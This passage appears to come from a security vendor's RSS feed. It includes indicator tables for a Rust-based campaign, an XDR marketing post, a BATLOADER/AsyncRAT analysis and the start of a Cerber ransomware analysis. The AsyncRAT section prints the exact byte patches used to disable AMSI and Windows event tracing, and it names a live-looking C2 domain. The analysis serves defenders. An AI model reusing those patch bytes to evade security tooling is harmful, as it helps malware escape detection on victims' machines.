rowspan=\"1\">C:\\Users\\123\\Desktop\\Aplet\\target\\release\\deps\\Aplet.pdb</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">D:\\HOME\\DESKTOP NEW DATA\\Zew\\target\\release\\deps\\Zew.pdb</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\"><b>Host</b></td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">C:\\ProgramData\\syscheck\\file.zip</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">C:\\ProgramData\\syscheck\\MySystem.exe</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">C:\\ProgramData\\syscheck\\MySystem.txt</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">C:\\ProgramData\\Micro\\logs.txt</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">C:\\ProgramData\\Micro\\records.txt</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">C:\\ProgramData\\Files\\Log.txt</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">C:\\ProgramData\\Files\\Records.txt</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">Documents\\downloadAndExecuteLog.txt</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">Documents\\file.ps1</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">Documents\\myfile.zip</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">Documents\\unzippedFolder\\file.exe</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">Documents\\Downloads\\myfile.pdf</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">Documents\\paths.txt</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">Documents\\suc_logs.txt</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">Documents\\Mail_Check.ps1</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">Documents\\syscheck.zip</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">Downloads\\1.pdf</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">Pictures\\sys.ps1</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\MySystem.exe</td>\n</tr>\n<tr>\n<td colspan=\"2\" rowspan=\"1\">%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\syscheck.exe</td>\n</tr>\n</tbody>\n</table>\n<p><strong>Author</strong>: Sathwik Ram Prakki</p>\n<p>The post <a rel=\"follow\" href=\"https://www.seqrite.com/blog/operation-rusticweb-targets-indian-govt-from-rust-based-malware-to-web-service-exfiltration/\" data-wpel-link=\"internal\" target=\"_self\">Operation RusticWeb targets Indian Govt: From Rust-based malware to Web-service exfiltration</a> appeared first on <a rel=\"follow\" href=\"https://www.seqrite.com/blog\" data-wpel-link=\"internal\" target=\"_self\">Blogs on Information Technology, Network &amp; Cybersecurity | Seqrite</a>.</p>\n"},"wfw:commentRss":"https://www.seqrite.com/blog/operation-rusticweb-targets-indian-govt-from-rust-based-malware-to-web-service-exfiltration/feed/","slash:comments":"0","commentcount":"0"},{"title":"Time to Secure the Future is Now: Use Cases for Choosing XDR Solution","link":"https://www.seqrite.com/blog/time-to-secure-the-future-is-now-use-cases-for-choosing-xdr-solution/","comments":"https://www.seqrite.com/blog/time-to-secure-the-future-is-now-use-cases-for-choosing-xdr-solution/#respond","pubDate":"Wed, 20 Dec 2023 06:18:49 +0000","dc:creator":{"#cdata-section":"Sourav Biswas"},"author":"Sourav Biswas","category":{"#cdata-section":"Uncategorized"},"guid":{"@isPermaLink":"false","#text":"https://www.seqrite.com/blog/?p=5964"},"img":"https://www.seqrite.com/blog/wp-content/uploads/2023/12/SEQRITE-Blog-new-XDR-2-230x168.png","description":{"#cdata-section":"<p>With an ever-growing attack surface in a hyper-connected digital world, there has never been a more critical time to secure the future. With access to tools like ChatGPT and more personalized spear-phishing attacks, hackers are always one step ahead, and it’s becoming increasingly difficult to detect and prevent attacks.  Getting in front of adversaries by [&#8230;]</p>\n<p>The post <a rel=\"follow\" href=\"https://www.seqrite.com/blog/time-to-secure-the-future-is-now-use-cases-for-choosing-xdr-solution/\" data-wpel-link=\"internal\" target=\"_self\">Time to Secure the Future is Now: Use Cases for Choosing XDR Solution</a> appeared first on <a rel=\"follow\" href=\"https://www.seqrite.com/blog\" data-wpel-link=\"internal\" target=\"_self\">Blogs on Information Technology, Network &amp; Cybersecurity | Seqrite</a>.</p>\n"},"content:encoded":{"#cdata-section":"<span class=\"rt-reading-time\" style=\"display: block;\"><span class=\"rt-label\">Estimated reading time: </span><span class=\"rt-time\">3</span><span class=\"rt-label\"> minutes</span></span><p><span data-preserver-spaces=\"true\">With an ever-growing attack surface in a hyper-connected digital world, there has never been a more critical time to secure the future. With access to tools like ChatGPT and more personalized spear-phishing attacks, hackers are always one step ahead, and it’s becoming increasingly difficult to detect and prevent attacks. </span></p>\n<p><span data-preserver-spaces=\"true\">Getting in front of adversaries by adopting a prevention-first strategy for early detection will allow organizations to stop disruptive attacks before they can cause damage. Today’s security resilience calls for more than the traditional siloed approach. It’s time for a more holistic protection against cyberattacks, unauthorized access, and misuse with XDR &#8211; Extended detection and response solution. </span></p>\n<p><strong><span data-preserver-spaces=\"true\">Why is XDR Important for Security Operations Modernization?</span></strong></p>\n<p><span data-preserver-spaces=\"true\">If you are looking for better visibility, accuracy, and prioritization across networks, devices, endpoints, clouds, and identities — rather than just one aspect of the infrastructure – XDR is a game changer.</span></p>\n<p><span data-preserver-spaces=\"true\">Today, many organizations rely on siloed security tools to identify and mitigate threats. This adversely affects their environments as their visibility gaps widen, and triage and remediation workflows ebb in efficiency.</span></p>\n<p><span data-preserver-spaces=\"true\">Designed to give organizations a holistic view of the cybersecurity posture and IT environment, XDR is an evolution of EDR that unlocks value across your entire security ecosystem. An advanced XDR solution collects, correlates, and analyzes security data from various sources to deliver actionable insights, increase visibility and situational awareness, accelerate detection and response, and reduce operational costs and complexity.</span></p>\n<p><span data-preserver-spaces=\"true\">This helps organizations eliminate traditional tools’ inherent inefficiencies and vulnerabilities and contain and remediate sophisticated attacks — faster and more efficiently. The best way to explain the real-world benefits of XDR is to look at how the functionality can help organizations in their daily IT operations and threat-hunting capabilities. Let’s explore some interesting XDR use cases that show its effectiveness and efficiency.</span></p>\n<p><strong><span data-preserver-spaces=\"true\">Top 3 XDR use cases</span></strong></p>\n<ol>\n<li><strong><span data-preserver-spaces=\"true\">Playbooks and Connectors for automated actions/remediation</span></strong></li>\n</ol>\n<p><span data-preserver-spaces=\"true\">XDR collects and automatically correlates data across multiple security layers, correlating the kill chain, and enabling applications and dashboards to analyze incidents, thus creating a unified cybersecurity view. </span></p>\n<p><span data-preserver-spaces=\"true\">It then enhances the incident response by correlating alerts, accelerating response time, and limiting impact scope. Its playbooks automate diverse actions, simplifying assessment and remediation without extra integrations. Easy to deploy, XDR playbooks efficiently decrease the time analysts dedicate to remediating incidents.</span></p>\n<ol>\n<li><strong><span data-preserver-spaces=\"true\">Enhanced threat detection using advanced analytics </span></strong></li>\n</ol>\n<p><span data-preserver-spaces=\"true\">Siloed security tools can slow down threat-hunting and mitigation efforts, making it challenging to identify incident insights, as seen in the Log4J vulnerability and related attacks. </span></p>\n<p><span data-preserver-spaces=\"true\">XDR can quickly determine massive breaches, understand their impact, and respond promptly. It uses advanced security analytics to analyze large volumes of data and uncover hidden threats like zero-day and targeted attacks. It then consolidates alerts to efficiently and effectively triage the events through multiple rules based on MITRE attack techniques. The automated threat intelligence capability reduces the time taken to identify threats, increasing the speed and effectiveness of the response.</span></p>\n<ol>\n<li><strong><span data-preserver-spaces=\"true\">Threat Hunting Enrichment</span></strong></li>\n</ol>\n<p><span data-preserver-spaces=\"true\">XDR provides unlimited global threat intelligence to face advanced persistent threats (APTs) and targeted attacks fearlessly. It also identifies the patterns of cybercriminals to predict their suspicious activities ahead of their execution. Then, it correlates it against telemetry and security logs to pinpoint the accuracy of immediate and future threats.</span></p>\n<p><strong><span data-preserver-spaces=\"true\">Conclusion </span></strong></p>\n<p><span data-preserver-spaces=\"true\">With the XDR solution, detect more, act faster, and elevate productivity to achieve security resilience. Introducing SEQRITE HawkkHunt XDR – a simplified solution to efficiently stop the most sophisticated hidden threats and adversaries with unified visibility and powerful analytics. </span></p>\n<p><span data-preserver-spaces=\"true\">With the increasing sophistication of the adversary, XDR is the unifying call for the industry to come together and position customers to protect their most critical assets. XDR is a crucial component of embracing security resilience for your business. Talk to our experts today! </span></p>\n<p>The post <a rel=\"follow\" href=\"https://www.seqrite.com/blog/time-to-secure-the-future-is-now-use-cases-for-choosing-xdr-solution/\" data-wpel-link=\"internal\" target=\"_self\">Time to Secure the Future is Now: Use Cases for Choosing XDR Solution</a> appeared first on <a rel=\"follow\" href=\"https://www.seqrite.com/blog\" data-wpel-link=\"internal\" target=\"_self\">Blogs on Information Technology, Network &amp; Cybersecurity | Seqrite</a>.</p>\n"},"wfw:commentRss":"https://www.seqrite.com/blog/time-to-secure-the-future-is-now-use-cases-for-choosing-xdr-solution/feed/","slash:comments":"0","commentcount":"0"},{"title":"Decoding BATLOADER 2.X: Unmasking the Threat of Stealthy Malware Tactics","link":"https://www.seqrite.com/blog/decoding-batloader-2-x-unmasking-the-threat-of-stealthy-malware-tactics/","comments":"https://www.seqrite.com/blog/decoding-batloader-2-x-unmasking-the-threat-of-stealthy-malware-tactics/#respond","pubDate":"Mon, 18 Dec 2023 10:23:54 +0000","dc:creator":{"#cdata-section":"Rumana Siddiqui"},"author":"Rumana Siddiqui","category":{"#cdata-section":"Uncategorized"},"guid":{"@isPermaLink":"false","#text":"https://www.seqrite.com/blog/?p=5940"},"img":"https://www.seqrite.com/blog/wp-content/uploads/2023/12/batloader-230x168.png","description":{"#cdata-section":"<p>Overview: Batloader is not a new malware in the series &#8211; it is an emerging one. In our previous blogs, we discussed how Batloader can deploy different types of malware, including stealers and ransomware. We also delved into its role as an initial access gainer, and highlighted its highly evasive nature, along with its ability [&#8230;]</p>\n<p>The post <a rel=\"follow\" href=\"https://www.seqrite.com/blog/decoding-batloader-2-x-unmasking-the-threat-of-stealthy-malware-tactics/\" data-wpel-link=\"internal\" target=\"_self\">Decoding BATLOADER 2.X: Unmasking the Threat of Stealthy Malware Tactics</a> appeared first on <a rel=\"follow\" href=\"https://www.seqrite.com/blog\" data-wpel-link=\"internal\" target=\"_self\">Blogs on Information Technology, Network &amp; Cybersecurity | Seqrite</a>.</p>\n"},"content:encoded":{"#cdata-section":"<span class=\"rt-reading-time\" style=\"display: block;\"><span class=\"rt-label\">Estimated reading time: </span><span class=\"rt-time\">5</span><span class=\"rt-label\"> minutes</span></span><p><strong>Overview:</strong></p>\n<p>Batloader is not a new malware in the series &#8211; it is an emerging one. In our previous blogs, we discussed how Batloader can deploy different types of malware, including stealers and ransomware. We also delved into its role as an initial access gainer, and highlighted its highly evasive nature, along with its ability to continuously upgrade itself over time.</p>\n<p>Various techniques are employed in delivering malware to the user’s system. Such methods include phishing emails, masquerading documents, or downloading cracked software. Amongst these, downloading cracked software may seem harmless to regular users since malware often utilizes genuine file names and conducts most of the malicious activities in the background, or injects a clean file with malicious code.</p>\n<p>In this blog, we will analyze how Batloader loads the payload, which in this case, is a stealer.</p>\n<p><strong>Technical Analysis:</strong></p>\n<p><img class=\"size-full wp-image-5942 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure1.png\" alt=\"\" width=\"626\" height=\"183\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure1.png 626w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure1-300x88.png 300w\" sizes=\"(max-width: 626px) 100vw, 626px\" /></p>\n<p style=\"text-align: center;\">Figure 1: Infection Chain</p>\n<p>The cabinet file contains a bat file, which is dropped at a temporary location, executed, and later deleted.</p>\n<p><img class=\"size-full wp-image-5943 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure2.png\" alt=\"\" width=\"482\" height=\"269\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure2.png 482w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure2-300x167.png 300w\" sizes=\"(max-width: 482px) 100vw, 482px\" /></p>\n<p style=\"text-align: center;\">Figure 2: Cabinet File</p>\n<p><img class=\"size-full wp-image-5944 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure3.png\" alt=\"\" width=\"482\" height=\"160\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure3.png 482w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure3-300x100.png 300w\" sizes=\"(max-width: 482px) 100vw, 482px\" /></p>\n<p style=\"text-align: center;\">Figure 3: Bat File Extracted</p>\n<p>The starting comment for the obfuscated bat file is a base64 encoded, AES-encrypted gZip stream. This is later decrypted to a dotnet file and then dropped at a temp location.</p>\n<p><img class=\"size-full wp-image-5945 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure4.png\" alt=\"\" width=\"624\" height=\"159\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure4.png 624w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure4-300x76.png 300w\" sizes=\"(max-width: 624px) 100vw, 624px\" /></p>\n<p style=\"text-align: center;\">Figure 4<em>:</em> Obfuscated Bat File</p>\n<p><img class=\"size-full wp-image-5946 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure5.png\" alt=\"\" width=\"624\" height=\"164\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure5.png 624w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure5-300x79.png 300w\" sizes=\"(max-width: 624px) 100vw, 624px\" /></p>\n<p style=\"text-align: center;\">Figure 5: Obfuscated Bat File</p>\n<p>The deobfuscated bat file contains a PowerShell script that copies the genuine powershell.exe to the current folder and executes it. The PowerShell script then takes the starting comment in the bat file to perform the below actions &#8211;</p>\n<ol>\n<li>Remove specific keywords.</li>\n<li>Convert it from Base64 encoding.</li>\n<li>AES decryption with CBC mode.</li>\n<li>Decompressed the GZipStream received from 3<sup>rd</sup></li>\n<li>Load the Assembly from EntryPoint.</li>\n</ol>\n<p><img class=\"size-full wp-image-5947 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure6.png\" alt=\"\" width=\"624\" height=\"401\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure6.png 624w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure6-300x193.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure6-570x365.png 570w\" sizes=\"(max-width: 624px) 100vw, 624px\" /></p>\n<p style=\"text-align: center;\">Figure 6: PowerShell Script</p>\n<p>The powershell script drops the Asyncrat malware dotnet exe under the temp folder and starts its execution.</p>\n<p><strong>Stage 3: AsyncRat</strong></p>\n<p>The dropped file is unprotected and deobfuscated.</p>\n<p><img class=\"size-full wp-image-5948 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure7.png\" alt=\"\" width=\"516\" height=\"294\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure7.png 516w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure7-300x171.png 300w\" sizes=\"(max-width: 516px) 100vw, 516px\" /></p>\n<p style=\"text-align: center;\">Figure 7<em>:</em> Dropped Exe File</p>\n<p>Execution of asyncrat starts with Initializing the configurations by decrypting the values, which are AES encrypted in CBC mode with base64 encoding.</p>\n<p><img class=\"size-full wp-image-5949 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure8.png\" alt=\"\" width=\"624\" height=\"219\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure8.png 624w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure8-300x105.png 300w\" sizes=\"(max-width: 624px) 100vw, 624px\" /></p>\n<p style=\"text-align: center;\">Figure 8: Configuration Initialization</p>\n<p><img class=\"size-full wp-image-5950 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure9.png\" alt=\"\" width=\"624\" height=\"207\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure9.png 624w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure9-300x100.png 300w\" sizes=\"(max-width: 624px) 100vw, 624px\" /></p>\n<p style=\"text-align: center;\">Figure 9: AES Decryption</p>\n<p><strong>Anti Analysis Module</strong></p>\n<p>It examines the environment to find out if the sample is under analysis by checking for the presence of a debugger, sandbox, and other indicators. If any are detected, it terminates its execution.</p>\n<p><img class=\"size-full wp-image-5951 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure10.png\" alt=\"\" width=\"624\" height=\"97\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure10.png 624w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure10-300x47.png 300w\" sizes=\"(max-width: 624px) 100vw, 624px\" /></p>\n<p style=\"text-align: center;\">Figure 10: Anti-Analysis Module</p>\n<p>If any amongst the list of processes like Taskmgr, ProcessHacker, ProcExp, etc., are detected during execution, results in the processes being terminated.</p>\n<p><img class=\"size-full wp-image-5952 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure11.png\" alt=\"\" width=\"624\" height=\"206\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure11.png 624w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure11-300x99.png 300w\" sizes=\"(max-width: 624px) 100vw, 624px\" /></p>\n<p style=\"text-align: center;\">Figure 11: Terminating Process</p>\n<p><strong>AMSI and Event Tracing Bypass </strong></p>\n<p>To bypass AMSI/event tracing it identifies the system architecture based on which corresponding functions are called.</p>\n<p><img class=\"size-full wp-image-5953 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure12.png\" alt=\"\" width=\"381\" height=\"190\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure12.png 381w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure12-300x150.png 300w\" sizes=\"(max-width: 381px) 100vw, 381px\" /></p>\n<p style=\"text-align: center;\">Figure 12: ByPass</p>\n<p>AMSI is a windows Anti Malware Scan Interface that allows applications and services to integrate with anti-malware product.</p>\n<p>Components that are integrated with AMSI are:</p>\n<ul>\n<li>User Access Control</li>\n<li>Powershell</li>\n<li>Windows Script Host</li>\n<li>JavaScript and VBScript</li>\n<li>Office VBA Macro</li>\n</ul>\n<p>To bypass it patches amsi.dll’s amsiscanbuffer() function.</p>\n<p><img class=\"size-full wp-image-5954 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure13.png\" alt=\"\" width=\"588\" height=\"210\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure13.png 588w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure13-300x107.png 300w\" sizes=\"(max-width: 588px) 100vw, 588px\" /></p>\n<p style=\"text-align: center;\">Figure 13: AMSI ByPass</p>\n<p> To achieve this</p>\n<ul>\n<li>First it retrieves the address of the corresponding function &#8211; amsiscanbuffer</li>\n<li>Then, it changes the memory protection, using NtProtectVirtualMemory(), for the page to write the new instructions.</li>\n<li>Further, it patches the memory with corresponding new bytes:\n<ul>\n<li>x86_am_si_patch = 0xB8, 0x57, 0x00, 0x07, 0x80, 0xc2, 0x18, 0x00;</li>\n<li>x64_am_si_patch = 0xB8, 0x57, 0x00, 0x07, 0x80, 0xc3;</li>\n</ul>\n</li>\n</ul>\n<p><img class=\"size-full wp-image-5955 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure14.png\" alt=\"\" width=\"624\" height=\"227\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure14.png 624w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure14-300x109.png 300w\" sizes=\"(max-width: 624px) 100vw, 624px\" /></p>\n<p style=\"text-align: center;\">Figure 14: Patching Memory</p>\n<p>Event tracing is a mechanism used to trace user and kernel level applications/drivers and is a part of the windows operating system. It is an important feature that helps security vendors to identify anomalous behavior in the running applications.</p>\n<p>To bypass, it patches the EtwEventWrite() function of ntdll. To achieve this, the process is the same as mentioned above for amsi bypass. Newly written bytes are:</p>\n<ul>\n<li>x64_etw_patch = 0x48, 0x33, 0xc0, 0xc3;</li>\n<li>x86_etw_patch = 0x33, 0xc0, 0xc2, 0x14, 0x00;</li>\n</ul>\n<p><img class=\"size-full wp-image-5956 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure15.png\" alt=\"\" width=\"447\" height=\"73\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure15.png 447w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure15-300x49.png 300w\" sizes=\"(max-width: 447px) 100vw, 447px\" /></p>\n<p style=\"text-align: center;\">Figure 15: Event Tracing ByPass</p>\n<p><strong>Persistence</strong></p>\n<p>It creates a run entry if it has admin rights. Otherwise it creates a scheduled task for timely execution.</p>\n<p><img class=\"size-full wp-image-5957 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure16.png\" alt=\"\" width=\"624\" height=\"101\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure16.png 624w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure16-300x49.png 300w\" sizes=\"(max-width: 624px) 100vw, 624px\" /></p>\n<p style=\"text-align: center;\">Figure 16: Registry Entry</p>\n<p><img class=\"size-full wp-image-5958 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure17.png\" alt=\"\" width=\"513\" height=\"259\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure17.png 513w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure17-300x151.png 300w\" sizes=\"(max-width: 513px) 100vw, 513px\" /></p>\n<p style=\"text-align: center;\">Figure 17: Schedule Task</p>\n<p>It creates a temporary bat file to copy itself to %temp% location and later deletes the bat file and starts execution of dropped file.</p>\n<p><img class=\"size-full wp-image-5959 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure18.png\" alt=\"\" width=\"550\" height=\"137\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure18.png 550w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure18-300x75.png 300w\" sizes=\"(max-width: 550px) 100vw, 550px\" /></p>\n<p style=\"text-align: center;\">Figure 18: Installation</p>\n<p>Then it checks for Pastebin details if that is set to null, it tries to connect with url “jzx100.myddns.me”. After that, it keeps on trying to connect in loop until it gets the connection.</p>\n<p><img class=\"size-full wp-image-5960 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure19.png\" alt=\"\" width=\"624\" height=\"197\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure19.png 624w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure19-300x95.png 300w\" sizes=\"(max-width: 624px) 100vw, 624px\" /></p>\n<p style=\"text-align: center;\">Figure 19: CnC Connection</p>\n<p>Once the connection is successful it will send the below information username, OS, Camera, antivirus installed, etc., as shown in the pic.</p>\n<p><img class=\"size-full wp-image-5961 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure20.png\" alt=\"\" width=\"624\" height=\"195\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure20.png 624w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure20-300x94.png 300w\" sizes=\"(max-width: 624px) 100vw, 624px\" /></p>\n<p style=\"text-align: center;\">Figure 20: Sending Info to CnC</p>\n<p>At the time of our analysis the url was not active. Through code analysis it also looks like it will receive below commands from CnC and it will work accordingly where it seems to invoke the plugin received in the packet and keep the connection alive.</p>\n<p><img class=\"size-full wp-image-5962 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure21.png\" alt=\"\" width=\"366\" height=\"153\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure21.png 366w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Figure21-300x125.png 300w\" sizes=\"(max-width: 366px) 100vw, 366px\" /></p>\n<p style=\"text-align: center;\">Figure 21: CnC Commands</p>\n<p><strong>Conclusion:</strong></p>\n<p>Users should avoid downloading cracked software as they do more harm without users’ knowledge. Stealers sending sensitive data to the CnC could be used further to plan attacks or to gain profit. Moreover, these stealers have features to download more payloads, which can lead to the deployment of ransomware onto the system.</p>\n<p><strong>IOC’s:</strong></p>\n<p>96B07F8951F4BDEB95856D9477071865</p>\n<p>1528F443777A42B09AE19D7E6F5F508A</p>\n<p><strong>Author:</strong></p>\n<p>Rumana Siddiqui</p>\n<p>The post <a rel=\"follow\" href=\"https://www.seqrite.com/blog/decoding-batloader-2-x-unmasking-the-threat-of-stealthy-malware-tactics/\" data-wpel-link=\"internal\" target=\"_self\">Decoding BATLOADER 2.X: Unmasking the Threat of Stealthy Malware Tactics</a> appeared first on <a rel=\"follow\" href=\"https://www.seqrite.com/blog\" data-wpel-link=\"internal\" target=\"_self\">Blogs on Information Technology, Network &amp; Cybersecurity | Seqrite</a>.</p>\n"},"wfw:commentRss":"https://www.seqrite.com/blog/decoding-batloader-2-x-unmasking-the-threat-of-stealthy-malware-tactics/feed/","slash:comments":"0","commentcount":"0"},{"title":"Cerber Ransomware Exposed: A Comprehensive Analysis of Advanced Tactics, Encryption, and Evasion","link":"https://www.seqrite.com/blog/cerber-ransomware-exposed-a-comprehensive-analysis-of-advanced-tactics-encryption-and-evasion/","comments":"https://www.seqrite.com/blog/cerber-ransomware-exposed-a-comprehensive-analysis-of-advanced-tactics-encryption-and-evasion/#respond","pubDate":"Wed, 13 Dec 2023 10:14:38 +0000","dc:creator":{"#cdata-section":"Soumen Burma"},"author":"Soumen Burma","category":{"#cdata-section":"Uncategorized"},"guid":{"@isPermaLink":"false","#text":"https://www.seqrite.com/blog/?p=5917"},"img":"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Cerber-230x168.jpg","description":{"#cdata-section":"<p>Cerber is a strain of ransomware that was first identified in early 2016. It is a type of malware that encrypts a victim&#8217;s files and demands a ransom for the decryption key needed to unlock the files. Cerber, like many other ransomware variants, typically targets individuals and organizations by encrypting their files and demanding a [&#8230;]</p>\n<p>The post <a rel=\"follow\" href=\"https://www.seqrite.com/blog/cerber-ransomware-exposed-a-comprehensive-analysis-of-advanced-tactics-encryption-and-evasion/\" data-wpel-link=\"internal\" target=\"_self\">Cerber Ransomware Exposed: A Comprehensive Analysis of Advanced Tactics, Encryption, and Evasion</a> appeared first on <a rel=\"follow\" href=\"https://www.seqrite.com/blog\" data-wpel-link=\"internal\" target=\"_self\">Blogs on Information Technology, Network &amp; Cybersecurity | Seqrite</a>.</p>\n"},"content:encoded":{"#cdata-section":"<span class=\"rt-reading-time\" style=\"display: block;\"><span class=\"rt-label\">Estimated reading time: </span><span class=\"rt-time\">6</span><span class=\"rt-label\"> minutes</span></span><p>Cerber is a strain of ransomware that was first identified in early 2016. It is a type of malware that encrypts a victim&#8217;s files and demands a ransom for the decryption key needed to unlock the files. Cerber, like many other ransomware variants, typically targets individuals and organizations by encrypting their files and demanding a ransom payment (usually in cryptocurrencies like Bitcoin) for the decryption key.</p>\n<p><strong>Technical Analysis:</strong></p>\n<p>The Cerber ransomware main payload is a custom-packed sample, so the code is initially unreadable. After unpacking the sample, we found the actual payload 376165CCD556CD74658AFEA9F6F428F9. As shown in Fig 1.</p>\n<p><img class=\"size-full wp-image-5919 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.1_Unpacking-of-cerber.png\" alt=\"\" width=\"635\" height=\"528\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.1_Unpacking-of-cerber.png 635w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.1_Unpacking-of-cerber-300x249.png 300w\" sizes=\"(max-width: 635px) 100vw, 635px\" /></p>\n<p style=\"text-align: center;\"><em>Fig.1: Unpacking of Cerber</em></p>\n<p>When the payload is executed, it checks for a specific mutex. If any of the mutexes are found to be present, the malware will stop its execution. This validation mechanism, involving mutex strings, is built into the ransomware code to prevent it from re-infecting the same machine.</p>\n<p><img class=\"size-full wp-image-5920 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.2_Creating-Mutex.png\" alt=\"\" width=\"1064\" height=\"90\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.2_Creating-Mutex.png 1064w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.2_Creating-Mutex-300x25.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.2_Creating-Mutex-768x65.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.2_Creating-Mutex-1024x87.png 1024w\" sizes=\"(max-width: 1064px) 100vw, 1064px\" /></p>\n<p style=\"text-align: center;\"><em>Fig.2: Creating Mutex</em></p>\n<p>Further, decrypt the data using CryptoAPI, which contains the following 